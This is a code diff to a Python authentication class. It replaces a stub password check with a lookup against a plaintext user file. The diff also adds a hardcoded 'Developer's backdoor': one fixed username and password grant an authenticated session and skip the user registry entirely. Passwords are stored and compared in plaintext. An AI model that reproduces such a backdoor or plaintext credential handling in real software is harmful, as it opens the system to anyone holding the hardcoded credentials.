@@ -5,6 +5,8 @@ Created on Thu May  5 21:50:29 2022
 @author: Robert J McGinness
 """
 
+from typing import Dict
+
 from config import Config
 
 
@@ -63,6 +65,8 @@ class Authenticator:
         ######FAKED FOR NOW
         ######HIT DB INSTEAD
         #################################################################
+        registered_users = self.__load_registrants()
+        
         try:
             header = kwargs['request_type'].split(' ')
             query_pairs = header[1].split('&')
@@ -73,19 +77,37 @@ class Authenticator:
                     username = query_pair.split('username=')[1]
                 if 'password=' in query_pair:
                     password = query_pair.split('password=')[1]
-            
+                    
             
             ##############################################
-            ######Authenicate username and password in DB
-            if password == 'fuzzystuff':
+            ######Developer's backdoor
+            if username == 'skinnerfan' and password == 'monstastriper':
+                self.__client = ServerClient("Developer",
+                                             self.__request.session,
+                                             authenticated=True)
+                return
+            
+            if username not in registered_users:
                 self.__client = None
-                return 
+                return
+        
+            if password != registered_users[username]:
+                self.__client = None
+                return
             
             self.__client = ServerClient(username,
                                          self.__request.session,
                                          authenticated=True)
         except ValueError:
             self.__client = None
+    
+    def __load_registrants(self) -> Dict:
+        registrants = {}
+        for user in open(self.__config.USER_DB, 'rt'):
+            user_pass = user.split('~')
+            registrants[user_pass[0].strip()] = user_pass[1].strip()
+        
+        return registrants
     
     @property
     def client(self) -> ServerClient:
